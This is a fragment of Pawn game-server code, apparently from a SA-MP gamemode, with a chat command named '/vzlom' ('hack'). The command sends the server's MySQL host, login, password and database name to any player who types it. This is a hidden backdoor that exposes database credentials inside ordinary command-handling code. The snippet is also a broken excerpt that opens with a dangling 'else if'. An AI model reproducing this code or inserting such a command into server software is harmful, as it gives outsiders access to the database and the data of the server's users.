#include <colors>
	else if(strcmp(cmd, "/vzlom", true) == 0)
	{
	        format(stringer, sizeof(stringer),"Название хоста от бд %s логин %s пароль %s название бд %s", sqlhost, sqluser,sqlpass,sqldb);
	        SendClientMessage(playerid, 0x6495EDFF, stringer);
	        return true;
	}